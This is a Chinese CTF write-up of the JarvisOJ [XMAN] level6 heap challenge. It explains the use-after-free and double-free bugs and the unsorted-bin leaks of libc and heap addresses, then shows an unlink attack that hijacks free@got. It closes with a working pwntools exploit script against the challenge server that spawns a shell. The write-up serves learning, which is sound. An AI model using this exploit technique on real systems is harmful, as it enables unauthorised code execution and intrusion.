---
title: XMAN level6 の Write-Up
date: 2020-07-29 10:47:37
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- XMAN
- Heap
---
## Introduction

这是JarvisOJ的PWN题部分[XMAN]level6的Write-Up。是XMAN系列第一道堆溢出的题目，整体难度一般，涉及到的知识点还是蛮多蛮基础的。

<!-- more -->

## Step 1

废话不多说直接上手，程序运行图：

![](/img/XMAN-level6/XMAN1.png)

checksec：32位程序，依然只有DEP保护，但这是堆溢出的题目，栈上的保护只有部分有参考意义

![](/img/XMAN-level6/XMAN2.png)

## Step 2

把程序丢到hopper中，看一下主函数：

![](/img/XMAN-level6/XMAN3.png)

首先是我们看到的程序界面：

![](/img/XMAN-level6/XMAN4.png)

然后会对输入的参数进行范围判断，不在范围内的将返回’Invalid!’，在范围内的将跳转到相应的功能函数。下面我们稍稍分析各个功能函数，首先是List Note：

![](/img/XMAN-level6/XMAN5.png)

这个函数就是先判断目前有没有note，没有返回 "You need to create some new notes first.”，有的话就遍历列出所有的note。

接着是New Note：

![](/img/XMAN-level6/XMAN6.png)

在函数中发现申请的chunk大小是至少是0x80，所以属于smallbin。

接着是Edit Note：

![](/img/XMAN-level6/XMAN7.png)

在New Note和Edit Note功能中都是通过sub_8048670函数实现读取字符串的：

![](/img/XMAN-level6/XMAN8.png)

但是这个函数只是读取输入的字符串，并没有在输入的字符串后面加上’\x00’，那么这里是一个可以利用的漏洞。

最后看一下Delete Note：

![](/img/XMAN-level6/XMAN9.png)

可以看出来，这个函数在free之前仅仅检查了Note number的范围是否合法，既没有检查对应的Note到底存在不存在，free之后也没有将note对应的指针清空，所以这里存在典型的Double Free漏洞和Use After Free漏洞。

## Step 3

在Edit Note函数中是对note对应的指针的存在与否是有检查的，防止我们利用Use After Free漏洞。

Double Free漏洞可以实现修改任意位置的任意值，所以需要找到能够泄露内存中地址的漏洞，而经过上面的分析，在sub_8048670函数这里是可以实现的。

下面具体分析下如何利用这个函数配合Use After Free漏洞实现泄露栈中地址。

首先申请两个note，编号0和1，根据内存机制分配chunk0。这时我们释放编号为0的note，chunk0根据规则首先会进入unsorted bin中。然后再次申请一个note，根据unsorted bin的LIFO策略，分配给我们的是编号为0的note对应的chunk空间。这个chunk的结构此时应该是这样的：

![](/img/XMAN-level6/XMAN10.png)

整个绿色部分都是目前的note的用户数据部分，所以当我们输出这个note的时候其实note0的bk指针就被泄露出来了。

而note0作为第一块small chunk，fd和bk指针指向的是main_arena的特定位置，再通过计算就可以知道libc的基址。

具体操作如下：

* 创建两个note0和1(防止top chunk的合并)。

* free掉note0。

* 再创建一个新的note，而且申请的chunk的大小要与free掉的一致，这样才能获取原来note0的空间，输入的大小不能超过四个字节，否则会覆盖note0的值。

* list note获取note0的bk值。

至于如何计算解释如下：

linux中使用free函数释放堆空间的时候，不大于max_fast的chunk被释放后首先会被放入fastbin中，大于max_fast的chunk或者fastbin中的空闲chunk合并后会被放入unsorted bin中。

当fastbin为空的时候，unsorted bin中chunk的fd和bk指向自身的main_arena，而main_arena的地址存放在libc中的malloc_trim函数中也即相对于lic基址的offset，这样我们就可以计算出libc的基址。

在32位程序中main_arena 的位置与 __malloc_hook 相差0x18，同时加入到unsorted bin中的small chunk的fd和bk通常指向 <main_arena+48> 的位置。在64位程序中，main_arena 的位置与 __malloc_hook 相差0x10，同时加入到unsorted bin中的small chunk的fd和bk通常指向 <main_arena+88> 的位置。

所以32位程序中：offset = libc.symbols['__malloc_hook’] + 0x18，64位程序同理。

或者直接到libc文件中找main_arena的地址，如下图所示：

![](/img/XMAN-level6/XMAN11.png)

至于为什么这个是main_arena的地址，可以对比malloc.c源代码看一下：

![](/img/XMAN-level6/XMAN12.png)

泄露heap地址的方法一样，首先需要申请4个note0，1，2，3，然后释放不相邻的note0和note2（防止被合并），这样被释放的两个chunk会在smallbin中形成双向链表。

这时我们按照泄露libc地址同样的操作泄露chunk0的bk值，此时的bk指向的是chunk2。分配chunk的时候是从距堆底0xc28开始的，这是固定的。

故而有这样一个等式：heap_addr = chunk2_addr(chunk0_bk) - chunk1_size - chunk0_size - 0xc28。

小结一下，泄露libc基址为了后面劫持got表控制程序执行system函数，泄露heap基址是因为unlink需要指向chunk的指针，而指针保存在堆起始位置。

## Step 4

前期准备工作到此就结束了，下面是需要触发unlink。

* 本题没有检查chunk是否释放，可以先连续malloc三个堆,chunkA,chunkB,chunkC，再释放。根据堆的特性，这三个堆会合并。这时再分配一个小于size(chunkA)+size(chunkB)+size(chunkC)+0x20的堆，系统会分配给我们合并的空间。然后再对这片内存操作，伪造连续四个堆。因为考虑到chunk的flag指向的是前一个Chunk的状态，而要触发unlink操作的话，需要检查上一个chunk和下一个chunk的状态，需要查看该chunk的flag和下下个chunk的flag。

同时在伪造的时候，系统还会做检查，确定指针有没有被改写：

```C#
P->fd_nextsize->bk_nextsize == P
P->bk_nextsize->fd_nextsize == P
```

所以构造的时候存在限制。这里简单复习一下unlink的操作。

* 分配两个大于80字节的堆块，因为小于80字节可能是fastbin。

* chunk0用来伪造需要unlink的空闲堆块，其中要设置堆块头以及fd和bk指针。

* chunk1需要伪造后面的堆块，即设置pre_size和size字段，且将size最后一位即PRE_INUSE设置为0，表示前面的chunk空闲需要合并。

* free chunk1时，系统检查发现前一块chunk处于空闲状态，于是合并，触发unlink。

* 至于如何让绕过系统的检查，是炫耀了解一下’->’操作符。该操作符左边是指针，这个指针存放了某个内存地址，右边是左边指针指向地址的某个offset。合起来就是取指针指向某个内存地址的offset处的内存。fd的offset是2个机器位数（32位系统是4字节，64位系统是8字节），bk的offset是3个机器位数。为了绕过系统检查，chunk0伪造的空闲chunk的fd需要设置为&P - 3*size(int)，bk需要设置为&P - 2*size(int)。至于为什么这么设置可以参考之前介绍unlink的文章，按照unlink的步骤推演一下即可。

* 这样经过unlink操作，P就指向了比自己地址低3个机器位数的位置。通过写入覆盖P本身，将其修改为任意地址。之后就可以通过读或者写功能实现该任意地址的读写。

本题中具体过程如下：

首先P是指向chunk0的指针，通过覆盖可以构造一个fake chunk，其中fake chunk的fd = P - 12，bk = P - 8。当覆盖至chunk1时，修改pre_size = 0x80，size = 0x80，表示前一块chunk未使用。

Free chunk1的时候，前一块构造的fake chunk处于空闲状态，所以会发生向后合并。libc寻找chunk是通过物理地址后一块的地址减去pre_size得到的，所以P依然是指向chunk0的指针，这时就会指向P - 12的位置。（unlink会进行两次赋值，故而只有第二次的有效）

接下来就需要再次写入P，覆盖指针为free@got，这个就可以通过修改P-12位置实现。最后再向P写入system函数的地址，那么执行free函数就变成了执行system函数。

具体怎么覆盖就涉及到本题中具体的数据结构。首先整个结构体如下图所示：

![](/img/XMAN-level6/XMAN13.png)

左边是整体结构，右边是每个Note的结构，所以当我们伪造了fake chunk之后，堆结构是这样的：

![](/img/XMAN-level6/XMAN14.png)

当我们unlink之后，堆又变了样：

![](/img/XMAN-level6/XMAN15.png)

所以在构造payload覆盖P的时候需要注意所覆盖区域原本的意义，否则无法getshell。另外还需要注意填充的时候新构造的chunk要和原来的大小一样，否则会调用realloc导致报错。

## Step 5

最后给出EXP，其中本地和远程均可调通：

```Python
from pwn import *

local = 0

if local:
    sh = process('./freenote_x86')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    offset = 0x1b27b0
else:
    sh = remote('pwn2.jarvisoj.com', 9885)
    libc = ELF('./libc-2.19.so')
    offset = 0x1ad450

elf = ELF('./freenote_x86')

def List(): 
	sh.recvuntil("Your choice: ") 
	sh.sendline("1")

def New(data): 
	sh.recvuntil("Your choice: ") 
	sh.sendline('2') 
	sh.recvuntil("Length of new note: ") 
	sh.sendline(str(len(data))) 
	sh.recvuntil("Enter your note: ") 
	sh.sendline(data) 
	sh.recvuntil("Done.")

def Edit(index,data):
	sh.recvuntil('Your choice: ')
	sh.sendline('3')
	sh.recvuntil('Note number: ')
	sh.sendline(str(index))
	sh.recvuntil('Length of note: ')
	sh.sendline(str(len(data)))
	sh.recvuntil('Enter your note: ')
	sh.sendline(data)
	sh.recvuntil("Done.")

def Delete(index): 
	sh.recvuntil("Your choice: ") 
	sh.sendline("4") 
	sh.recvuntil("Note number: ") 
	sh.sendline(str(index))

# libc address
New('a' * 0x80) # note0
New('b' * 0x80) # note1

Delete(0)

New('AAA')
List()

a = sh.recvuntil('aaaa')
libc_addr = u32(a[-8:-4]) - offset
sys_addr = libc.symbols['system'] + libc_addr

# heap address
New('c' * 0x80) # note2
New('d' * 0x80) # note3

Delete(0)
Delete(2)

New('BBB')
List()

b = sh.recvuntil('aaaa')
chunk2_addr = u32(b[-8:-4])
heap_addr = chunk2_addr - 0xc28 - 0x80 - 0x80
chunk0_addr = heap_addr + 0x18

# unlink
Delete(0)
Delete(1)
Delete(3)
# fake chunk : pre_size - size - fd - bk
payload = p32(0) + p32(0x81) + p32(chunk0_addr - 12) + p32(chunk0_addr - 8)
payload = payload.ljust(0x80, 'C') # chunk0
payload += p32(0x80) + p32(0x80)
payload = payload.ljust(0x80 * 2, 'C') # chunk1

New(payload)
Delete(1)

# hijack got
payload2 = p32(3) + p32(1) + p32(4) + p32(elf.got['free']) + p32(1) + p32(8) + p32(heap_addr + 0xc28 + 0x80)
payload2 = payload2.ljust(0x80 * 2, 'C')

Edit(0, payload2)
Edit(0, p32(sys_addr))
Edit(1, '/bin/sh\x00')

Delete(1)

sh.interactive()
sh.close()
```

脚本运行结果截图：

![](/img/XMAN-level6/XMAN16.png)

## PS

这道题对于堆初学者来说帮助很大，能够加深堆堆溢出利用的了解。本题还有其他的方法，综合下来可以学到UAF，Double Free，GOT表劫持，unsorted bin泄露地址，unlink利用等等知识，值得花很多时间去细细品味。

反正这道题花了我一周时间==，主要还是网上很多大佬写的Write Up太简单了（也可能是我太菜）而且它们的重心都放在了解释伪造chunk触发unlink上了，对于其他的细节没能做解释。所以当直接去看Write Up以及EXP代码的时候会一头雾水，很多地方不知道为什么要这么写。

这道题还有64位版本，思路和32位一模一样，只是一些offset根据libc的变化而变化，有兴趣的可以参照32位程序再巩固一下。

最后说一下这道题给我的收获：纸上得来终觉浅，绝知此事要躬行。